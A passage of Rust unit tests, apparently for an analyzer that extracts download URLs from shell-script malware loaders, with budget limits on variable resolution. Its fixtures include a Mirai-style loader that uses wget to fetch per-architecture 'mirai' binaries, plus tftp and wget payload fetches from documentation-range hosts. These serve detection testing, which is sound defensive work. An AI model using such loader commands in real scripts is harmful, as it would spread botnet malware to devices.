        p.push_str(&format!("P3={}\n", "$P2".repeat(4)));
        p.push_str("Q0=$P3\nQ1=$P3\nQ2=$P3\n");
        for i in 0..47 {
            p.push_str(&format!("U{i}=$P1\n"));
        }
        p
    }

    const ARCH_LOADER: &str = "ARCHS=\"arm arm5 arm7 mips mpsl sh4 m68k ppc ppc440fp spc\"\n\
         SERVER=\"198.51.100.4\"\n\
         for arch in $ARCHS; do wget \"http://$SERVER/mirai.$arch\"; done\n";

    // Unrelated assignments that would spend the whole budget if they were resolved eagerly hid
    // every variable-built url, wherever they sat in the body. They are resolved only when a
    // url token, `for` list or `tftp` pair uses them, so they cost nothing here.
    #[test]
    fn unreferenced_assignments_do_not_hide_a_variable_built_loader() {
        let preamble = spending_preamble();
        let mut eager = Budget::new();
        Vars::parse(&preamble).resolved_map(&mut eager);
        assert_eq!(eager.left, 0, "the fixture must spend the whole budget");

        for body in [
            format!("{preamble}{ARCH_LOADER}"),
            format!("{ARCH_LOADER}{preamble}"),
            format!("{preamble}{ARCH_LOADER}{preamble}"),
        ] {
            let (_, urls) = assert_bounded(&body);
            assert_eq!(urls.len(), 10, "{urls:?}");
            assert!(urls.contains(&"http://198.51.100.4/mirai.ppc440fp".to_string()));
        }

        // The same for a tftp pair and a `for` list named through an unrelated spend.
        let tftp = format!("{preamble}H=198.51.100.5\ntftp -g -r m.mips $H\n");
        assert_eq!(
            extract_urls(tftp.as_bytes()),
            vec!["tftp://198.51.100.5/m.mips".to_string()]
        );
    }

    // References that do spend the budget still end resolution, but a url written out literally
    // after them is taken.
    #[test]
    fn a_budget_spent_by_used_references_still_takes_a_literal_url() {
        let mut body = spending_preamble();
        for i in 0..3 {
            body.push_str(&format!("wget http://$Q{i}/x\n"));
        }
        body.push_str("wget http://198.51.100.5/a.sh\n");
        let (_, urls) = assert_bounded(&body);
        assert_eq!(urls, vec!["http://198.51.100.5/a.sh".to_string()]);
    }

    #[test]
    fn a_chain_as_deep_as_a_body_allows_still_resolves() {
        // 4000 links, about 52 KB: the walk keeps its own stack, so depth costs no thread stack.
        let mut body = String::new();
        for i in 0..4000 {
            body.push_str(&format!("C{i}=$C{}\n", i + 1));
        }
        body.push_str("C4000=198.51.100.9\nwget http://$C0/p\n");
        assert!(body.len() <= MAX_BODY_LEN);
        let (_, urls) = assert_bounded(&body);
        assert_eq!(urls, vec!["http://198.51.100.9/p".to_string()]);
    }

    /// xorshift64: a fixed-seed generator, so a failure names a reproducible case.
    struct Rng(u64);

    impl Rng {
        fn next(&mut self) -> u64 {
            self.0 ^= self.0 << 13;
            self.0 ^= self.0 >> 7;
            self.0 ^= self.0 << 17;
            self.0
        }

        fn below(&mut self, n: usize) -> usize {
            (self.next() % n as u64) as usize
        }
    }

    /// One generated value part: a literal, or a reference (plain or braced) to var `j`.
    enum Part {
        Lit(&'static str),
        Ref(usize),
    }

    /// The honest resolution of var `i` by plain recursion, or `None` once it would pass `cap`
    /// bytes or names an unassigned var. Only called on acyclic sets.
    fn reference_value(i: usize, sets: &[Vec<Part>], cap: usize) -> Option<String> {
        let mut out = String::new();
        for part in &sets[i] {
            match part {
                Part::Lit(s) => out.push_str(s),
                Part::Ref(j) if *j < sets.len() => out.push_str(&reference_value(*j, sets, cap)?),
                Part::Ref(_) => return None,
            }
            if out.len() > cap {
                return None;
            }
        }
        Some(out)
    }

    // Property: over generated assignment sets (self, mutual and repeated references, unknown
    // names, braced forms, forward and backward order), resolution and extraction stay within
    // MAX_RESOLVED_LEN per value and MAX_EXPANSION_BYTES plus the body length in total (see
    // assert_bounded), and an acyclic set whose honest resolution is small resolves to exactly
    // that.
    #[test]
    fn generated_assignment_sets_resolve_within_the_bound() {
        const LITS: [&str; 5] = ["a", "/", "198.51.100.7", ":8080", "x86 arm"];
        let mut rng = Rng(0x9e37_79b9_7f4a_7c15);
        let mut compared = 0;
        for case in 0..600 {
            let n = 1 + rng.below(10);
            let acyclic = case % 2 == 0;
            let sets: Vec<Vec<Part>> = (0..n)
                .map(|i| {
                    (0..rng.below(7))
                        .map(|_| {
                            if rng.below(3) == 0 {
                                Part::Lit(LITS[rng.below(LITS.len())])
                            } else if acyclic {
                                // Only later vars, plus the occasional unassigned name.
                                Part::Ref(i + 1 + rng.below(n - i + 1))
                            } else {
                                Part::Ref(rng.below(n + 2))
                            }
                        })
                        .collect()
                })
                .collect();
            let mut body = String::new();
            let mut lines: Vec<usize> = (0..n).collect();
            if rng.below(2) == 0 {
                lines.reverse();
            }
            for i in lines {
                body.push_str(&format!("V{i}=\""));
                for (k, part) in sets[i].iter().enumerate() {
                    // A plain `$Vj` running into a literal that starts with a word character
                    // would name a different var, as in a shell.
                    let glued = matches!(sets[i].get(k + 1), Some(Part::Lit(s))
                        if s.starts_with(|c: char| c.is_ascii_alphanumeric()));
                    match part {
                        Part::Lit(s) => body.push_str(s),
                        Part::Ref(j) if !glued && rng.below(2) == 0 => {
                            body.push_str(&format!("$V{j}"))
                        }
                        Part::Ref(j) => body.push_str(&format!("${{V{j}}}")),
                    }
                }
                body.push_str("\"\n");
            }
            body.push_str("wget http://$V0/x\nfor w in $V0; do wget http://h/$w; done\n");

            let (vars, _) = assert_bounded(&body);
            if acyclic {
                for i in 0..n {
                    if let Some(want) = reference_value(i, &sets, 4096) {
                        assert_eq!(
                            vars.get(&format!("V{i}")),
                            Some(&want),
                            "case {case}: {body}"
                        );
                        compared += 1;
                    }
                }
            }
        }
        // Not vacuous: 405 at this seed (a reference to an unassigned name opts a value out).
        assert!(compared > 300, "only {compared} values compared");
    }
}
